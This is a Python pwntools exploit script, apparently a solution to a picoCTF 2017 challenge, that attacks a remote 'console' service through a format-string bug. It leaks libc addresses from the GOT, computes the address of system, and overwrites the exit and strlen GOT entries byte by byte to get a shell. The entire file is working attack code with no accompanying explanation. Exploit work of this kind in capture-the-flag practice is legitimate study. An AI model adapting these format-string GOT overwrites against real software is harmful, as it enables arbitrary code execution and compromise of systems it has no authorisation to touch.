from pwn import *
import binascii
import re

EXIT_GOT = 0x601258
LOOP     = 0x4009bd
FGETS_GOT = 0x601230
FGETS_OFFSET = 0x69df0
SYSTEM_OFFSET = 0x41490
STRLEN_GOT = 0x601210


def overwrite_exit_got():
	r.recvuntil("tion: ")
	payload = "exit".ljust(8)
	payload += "%2487x".rjust(8)
	payload += "%17$hn".rjust(8)
	payload += p64(EXIT_GOT)
	print ("send payload - " + payload)
	r.sendline(payload)


def leak_libc():
	r.recvuntil("tion: ")
	payload = "exit".ljust(8)
	payload += "(%16$s)".rjust(8)
	payload += p64(FGETS_GOT)
	r.sendline(payload)
	r.recvline()
	fgets_libc = r.recv(100)
	fgets_libc = (fgets_libc[fgets_libc.find("(")+1:fgets_libc.find(")")])
	fgets_libc = hex(u64(fgets_libc.ljust(8, '\x00')))
	print ("fgets at libc - " +  fgets_libc)
	return (hex(int(fgets_libc, 16) - FGETS_OFFSET))


def resolve_libc_address_of_strlen():
	payload = "prompt".ljust(8)
	payload += "AAAAAAAA"
	r.sendline(payload)

def get_strlen_libc():
	r.recvuntil("tion: ")
	payload = "exit".ljust(8)
	payload += "(%16$s)".rjust(8)
	payload += p64(STRLEN_GOT)
	r.sendline(payload)
	r.recvline()
	strlen_libc = r.recv(100)
	strlen_libc = (strlen_libc[strlen_libc.find("(")+1:strlen_libc.find(")")])
	strlen_libc = hex(u64(strlen_libc.ljust(8, '\x00')))
	print ("strlen at libc - " +  strlen_libc)


def overwrite_strlen_got(libc_system):
	libc_system_splitted = [(libc_system[2:][i]+libc_system[2:][i+1]) for i in range(0,len(libc_system[2:]),2)]
	print libc_system_splitted
	
	write_to_memory(STRLEN_GOT+2, libc_system_splitted[-3], 0)
	r.recvuntil("tion:")
	write_to_memory(STRLEN_GOT, libc_system_splitted[-1], 0)
	r.recvuntil("tion:")
	write_to_memory(STRLEN_GOT+1, libc_system_splitted[-2], 0)
	r.recvuntil("tion:")
	

def write_to_memory(address_to_write, hex_byte, sub):
	payload = "exit".ljust(8)
	payload += ("%"+str(int(hex_byte, 16)-7+sub)+"c").rjust(8)
	payload += "%17$hhn".rjust(8)
	payload += p64(address_to_write)
	print ("send payload - " + payload)
	r.sendline(payload)

def handle_logic():
	overwrite_exit_got()
	libc_base = leak_libc()
	print ("libc base address - " + libc_base)
	libc_system = hex(int(libc_base, 16) + SYSTEM_OFFSET)
	print ("libc system address - " + libc_system)
	resolve_libc_address_of_strlen()
	get_strlen_libc()
	overwrite_strlen_got(libc_system)
	r.sendline("")
	get_strlen_libc()
	

if __name__ == "__main__":
	r = remote("shell2017.picoctf.com", 29925)
	#r = process(['./console', 'log.txt'])
	handle_logic()
	r.interactive()